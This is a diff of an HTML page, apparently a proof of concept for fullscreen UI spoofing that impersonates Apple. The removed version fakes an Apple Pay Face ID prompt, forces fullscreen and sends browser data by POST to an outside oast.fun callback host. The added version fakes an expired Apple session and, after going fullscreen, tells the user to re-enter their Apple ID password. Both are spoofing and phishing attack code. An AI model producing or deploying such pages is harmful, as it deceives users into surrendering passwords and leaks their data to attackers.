@@ -1,71 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Apple Pay</title>
+  <title>Apple Login</title>
   <style>
-    html, body {
-      margin: 0;
-      background: black;
-      color: white;
-      font-family: -apple-system;
-      height: 100vh;
+    body {
+      font-family: -apple-system, sans-serif;
       display: flex;
-      flex-direction: column;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+      background: white;
     }
-    .prompt {
-      background: #1c1c1e;
-      padding: 30px;
-      border-radius: 20px;
-      text-align: center;
-    }
-    .faceid {
-      font-size: 40px;
-      margin-bottom: 20px;
-    }
-    .btn {
-      background: #007aff;
-      color: white;
+    button {
       padding: 12px 24px;
-      border-radius: 10px;
       font-size: 18px;
-      margin-top: 20px;
-      border: none;
     }
   </style>
 </head>
 <body>
+  <h2>🔒 Apple Security</h2>
+  <p>Your session has expired. Please continue.</p>
+  <button onclick="beginSpoof()">Continue</button>
 
-<div class="prompt">
-  <div class="faceid">🔒 Face ID</div>
-  <div>Confirm with Side Button</div>
-  <button class="btn" onclick="exfil()">Confirm</button>
-</div>
-
-<script>
-function exfil() {
-  if (document.fullscreenElement) {
-    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
-      method: "POST",
-      mode: "no-cors",
-      body: JSON.stringify({
-        status: "fullscreen active",
-        ua: navigator.userAgent,
-        ts: Date.now()
-      })
-    });
-    alert("✅ Payment confirmed.");
-  } else {
-    alert("❌ Not in fullscreen. No data sent.");
-  }
-}
-
-window.onload = () => {
-  document.documentElement.requestFullscreen?.().catch(() => {});
-};
-</script>
-
+  <script>
+    function beginSpoof() {
+      document.documentElement.requestFullscreen().then(() => {
+        setTimeout(() => {
+          alert("🔐 Apple ID verification required.\nPlease re-enter your password.");
+        }, 1000);
+      }).catch(console.error);
+    }
+  </script>
 </body>
 </html>
